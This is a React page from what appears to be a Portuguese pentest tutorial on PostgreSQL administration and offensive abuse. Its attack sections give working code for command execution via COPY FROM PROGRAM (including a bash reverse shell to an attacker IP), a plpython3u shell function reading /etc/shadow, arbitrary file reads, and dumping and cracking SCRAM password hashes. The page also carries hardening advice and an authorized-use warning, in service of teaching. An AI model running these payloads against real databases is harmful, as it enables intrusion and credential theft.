import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PostgreSQL() {
  return (
    <PageContainer
      title="PostgreSQL"
      subtitle="psql, roles, pg_hba.conf — e como o Postgres vira RCE com COPY FROM PROGRAM e CREATE LANGUAGE plpython3u."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>Por que Postgres importa</h2>
      <p>
        <strong>PostgreSQL</strong> é o banco padrão por trás de muito SaaS, pipelines de
        dados (Airflow, Superset, Metabase) e — relevante pro Kali — é o banco do
        <code>msfdb</code>. Como atacante, Postgres é alvo gostoso: tem
        <code>COPY FROM PROGRAM</code> que dá RCE direto, suporta linguagens procedurais
        (<code>plpython3u</code>, <code>plperlu</code>) que executam código no host, e
        <code>pg_read_server_files()</code> ainda lê arquivos arbitrários se você for
        <code>superuser</code>.
      </p>

      <h2>Subir o Postgres no Kali (msfdb depende disso)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y postgresql postgresql-client",
            out: "Setting up postgresql-16 (16.4-1) ... Created symlink ... postgresql.service.",
            outType: "success",
          },
          {
            cmd: "sudo systemctl enable --now postgresql",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo -u postgres psql -c '\\du'",
            out: `                             List of roles
 Role name |                         Attributes
-----------+------------------------------------------------------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS`,
            outType: "info",
          },
          {
            comment: "deixa o msfconsole pronto",
            cmd: "sudo msfdb init",
            out: `[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf' and 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema`,
            outType: "success",
          },
        ]}
      />

      <h2>Cliente psql — o essencial</h2>
      <CommandTable
        title="psql / meta-comandos"
        variations={[
          { cmd: "sudo -u postgres psql", desc: "Entra como superuser via socket Unix (peer auth).", output: "postgres=#" },
          { cmd: "psql -h 10.10.10.50 -U dba -d app_db", desc: "Conecta remoto, banco específico (pede senha via PGPASSWORD ou prompt).", output: "Password for user dba:" },
          { cmd: "psql -c 'SELECT version();'", desc: "Roda comando one-shot.", output: "PostgreSQL 16.4 on x86_64-pc-linux-gnu" },
          { cmd: "\\l", desc: "Lista bancos (LIST databases).", output: "postgres, msf, msf_test, app_db" },
          { cmd: "\\c app_db", desc: "Conecta a outro banco.", output: "You are now connected to database \"app_db\"." },
          { cmd: "\\dt", desc: "Lista tabelas do schema atual.", output: "users, sessions, posts, ..." },
          { cmd: "\\d users", desc: "Descreve tabela: colunas, índices, FKs.", output: "Column | Type | Nullable | Default" },
          { cmd: "\\du", desc: "Lista roles e atributos (Superuser, CreateDB...).", output: "Útil pra mapear quem pode o quê." },
          { cmd: "\\dn", desc: "Schemas.", output: "public, pg_catalog, information_schema" },
          { cmd: "\\df", desc: "Funções definidas.", output: "Lista nomes/argumentos." },
          { cmd: "\\timing on", desc: "Mostra duração de cada query.", output: "Time: 0.342 ms" },
          { cmd: "\\copy table TO 'file.csv' CSV HEADER", desc: "Copia local (cliente) — não precisa SUPERUSER.", output: "COPY 1234" },
          { cmd: "\\q", desc: "Sai.", output: "" },
        ]}
      />

      <h2>Roles, bancos e permissões</h2>
      <CodeBlock
        language="sql"
        title="setup app + role com escopo"
        code={`-- cria role de login (= "user" no MySQL)
CREATE ROLE app_user WITH LOGIN PASSWORD 'TrocarSenhaForte#2026';

-- cria banco com owner certo
CREATE DATABASE app_db OWNER app_user ENCODING 'UTF8';

-- conecta no banco recém criado
\\c app_db

-- schema dedicado, evita poluir public
CREATE SCHEMA app AUTHORIZATION app_user;

-- por padrão public é open — fechar é boa prática
REVOKE ALL ON SCHEMA public FROM PUBLIC;
GRANT USAGE ON SCHEMA app TO app_user;

-- role de read-only para BI/analista
CREATE ROLE analista LOGIN PASSWORD 'Outra#Senha2026';
GRANT CONNECT ON DATABASE app_db TO analista;
GRANT USAGE ON SCHEMA app TO analista;
GRANT SELECT ON ALL TABLES IN SCHEMA app TO analista;
ALTER DEFAULT PRIVILEGES IN SCHEMA app GRANT SELECT ON TABLES TO analista;`}
      />

      <h2>pg_hba.conf — quem pode entrar de onde</h2>
      <CodeBlock
        language="ini"
        title="/etc/postgresql/16/main/pg_hba.conf (excerto)"
        code={`# TYPE  DATABASE        USER            ADDRESS                 METHOD

# socket local — peer = casa o user OS com o user PG (root,postgres)
local   all             postgres                                peer
local   all             all                                     peer

# loopback IPv4 — exige senha SCRAM
host    all             all             127.0.0.1/32            scram-sha-256

# rede privada do app — só uma role pode conectar nesse banco
host    app_db          app_user        10.10.10.0/24           scram-sha-256

# REGRA RUIM (não use em prod): trust = sem senha
# host    all           all             0.0.0.0/0               trust`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "depois de mexer no pg_hba, recarrega",
            cmd: "sudo systemctl reload postgresql",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "abrir pra rede precisa também listen_addresses no postgresql.conf",
            cmd: "sudo grep -E '^listen_addresses' /etc/postgresql/16/main/postgresql.conf",
            out: "listen_addresses = 'localhost'",
            outType: "info",
          },
        ]}
      />

      <h2>Backup e restore</h2>
      <CommandTable
        title="pg_dump / pg_restore"
        variations={[
          { cmd: "pg_dump -U app_user app_db > app.sql", desc: "Dump SQL plain de um banco.", output: "Texto SQL com COPY/INSERT." },
          { cmd: "pg_dump -F c -U postgres app_db -f app.dump", desc: "Formato custom (compactado, paralelizável).", output: "Binário rápido pra restaurar." },
          { cmd: "pg_dumpall -U postgres > full.sql", desc: "Dump global (inclui roles, senhas hash).", output: "Tem CREATE ROLE com PASSWORD em hash SCRAM." },
          { cmd: "psql -U postgres -d app_db < app.sql", desc: "Restaura SQL plain.", output: "Aplica statements." },
          { cmd: "pg_restore -U postgres -d app_db -j 4 app.dump", desc: "Restaura format custom em paralelo.", output: "4x mais rápido com jobs." },
        ]}
      />

      <h2>━━━ Ataque: COPY FROM PROGRAM = RCE ━━━</h2>
      <p>
        Se você comprometeu credenciais de uma role com <code>pg_execute_server_program</code>
        (ou é <code>SUPERUSER</code>), o caminho mais curto pra shell é abusar de
        <code>COPY ... FROM PROGRAM</code>. Funciona desde Postgres 9.3.
      </p>

      <CodeBlock
        language="sql"
        title="exec arbitrário via COPY FROM PROGRAM"
        code={`-- 1) prepara tabela auxiliar pra capturar saída
CREATE TABLE pwn (output TEXT);

-- 2) executa comando shell e lê saída
COPY pwn FROM PROGRAM 'id; uname -a; whoami';

SELECT * FROM pwn;
--          output
-- ----------------------------------------------------------------
--  uid=114(postgres) gid=119(postgres) groups=119(postgres),...
--  Linux target 6.6.15-amd64 #1 SMP ... GNU/Linux
--  postgres

-- 3) reverse shell direto
COPY pwn FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "no atacante, antes de disparar:",
            cmd: "nc -lvnp 4444",
            out: `listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.50] 51234
postgres@target:/var/lib/postgresql/16/main$ id
uid=114(postgres) gid=119(postgres) groups=119(postgres),113(ssl-cert)`,
            outType: "error",
          },
        ]}
      />

      <h2>━━━ Ataque: linguagens procedurais (plpython3u, plperlu) ━━━</h2>
      <p>
        Se a função puder ser criada (<strong>SUPERUSER</strong> ou role com privilégio),
        Python e Perl <em>untrusted</em> rodam código arbitrário no host.
      </p>

      <CodeBlock
        language="sql"
        title="RCE via plpython3u"
        code={`CREATE EXTENSION IF NOT EXISTS plpython3u;

CREATE OR REPLACE FUNCTION pyshell(cmd TEXT)
RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT pyshell('cat /etc/shadow');
-- root:$y$j9T$....
-- daemon:*:...`}
      />

      <h2>━━━ Ataque: leitura de arquivo + dump de hashes ━━━</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "via psql como superuser, ler qualquer arquivo do server",
            cmd: "psql -U postgres -c \"SELECT pg_read_server_file('/etc/passwd', 0, 200);\"",
            out: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
postgres:x:114:119:PostgreSQL administrator:/var/lib/postgresql:/bin/bash`,
            outType: "warning",
          },
          {
            comment: "dumpar hashes SCRAM-SHA-256 de pg_authid (precisa SUPERUSER)",
            cmd: "psql -U postgres -c \"SELECT rolname, rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL;\"",
            out: ` rolname  |                                rolpassword
----------+----------------------------------------------------------------------------------
 postgres | SCRAM-SHA-256$4096:Xj9k...$h+4...:Q3W...
 msf      | SCRAM-SHA-256$4096:9Fa...$Z8K...:M0p...`,
            outType: "warning",
          },
          {
            comment: "hashcat suporta SCRAM-SHA-256 (modo 28600)",
            cmd: "hashcat -m 28600 scram_hashes.txt /usr/share/wordlists/rockyou.txt",
            out: `Hashmode: 28600 (PostgreSQL SCRAM-SHA-256)
SCRAM-SHA-256$4096:9Fa...:msf123
Recovered: 1/2 (50.00%) Digests`,
            outType: "success",
          },
        ]}
      />

      <h2>━━━ Defesa: hardening real ━━━</h2>
      <CommandTable
        title="checklist defensivo"
        variations={[
          { cmd: "listen_addresses = 'localhost'", desc: "Não exponha na rede sem necessidade.", output: "/etc/postgresql/16/main/postgresql.conf" },
          { cmd: "scram-sha-256 (não md5/trust)", desc: "Hash moderno em pg_hba.conf.", output: "ALTER USER ... PASSWORD 'x' regrava no formato novo." },
          { cmd: "REVOKE pg_execute_server_program FROM app_user;", desc: "Bloqueia COPY FROM PROGRAM por role.", output: "Mitiga RCE ao roubar app_user." },
          { cmd: "REVOKE pg_read_server_files, pg_write_server_files FROM ...", desc: "Bloqueia leitura/escrita de arquivos arbitrários.", output: "Aplique a roles não-admin." },
          { cmd: "DROP EXTENSION plpython3u;", desc: "Se a app não usa, remova.", output: "Mata vetor de RCE via função." },
          { cmd: "ssl = on + ssl_cert_file/ssl_key_file", desc: "Força TLS pra conexões remotas.", output: "Combine com hostssl em pg_hba." },
          { cmd: "log_connections = on, log_disconnections = on", desc: "Auditoria — detecta brute force / enum.", output: "Vai pra /var/log/postgresql/." },
        ]}
      />

      <AlertBox type="warning" title="msfdb expõe Postgres em local — verifique antes de subir VPN">
        <p>
          Após <code>sudo msfdb init</code>, o Postgres do Kali fica escutando em
          <code>127.0.0.1:5432</code>. Em geral é seguro, mas se você vai virar
          <strong>jump host</strong> num pentest interno, certifique-se de que nenhum
          tunnel reverso ou container expõe essa porta.
        </p>
      </AlertBox>

      <PracticeBox
        title="Lab Postgres vulnerável → RCE"
        goal="Subir Postgres em Docker, conectar como superuser e ganhar shell via COPY FROM PROGRAM."
        steps={[
          "Suba container postgres com senha trivial (laboratório!).",
          "Conecte com psql do Kali.",
          "Crie tabela auxiliar pwn.",
          "Execute COPY FROM PROGRAM para listar /etc/passwd do CONTAINER.",
          "Confirme que rodou como user postgres.",
        ]}
        command={`docker run --rm -d --name pg-lab -e POSTGRES_PASSWORD=postgres -p 5433:5432 postgres:16

PGPASSWORD=postgres psql -h 127.0.0.1 -p 5433 -U postgres -c "
CREATE TABLE pwn(o TEXT);
COPY pwn FROM PROGRAM 'id; head -3 /etc/passwd';
SELECT * FROM pwn;
"`}
        expected={`              o
-----------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres)
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
(4 rows)`}
        verify="Se aparece o uid do user postgres + as linhas de /etc/passwd, o RCE via COPY FROM PROGRAM está validado. Em pentest real, troque pelo bash reverse shell."
      />

      <AlertBox type="danger" title="Use só em targets autorizados">
        <p>
          Toda técnica acima é destrutiva o suficiente pra parar serviço, vazar dado e gerar
          processo criminal. Pratique em containers descartáveis, máquinas HTB/THM ou alvos
          com escopo escrito.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
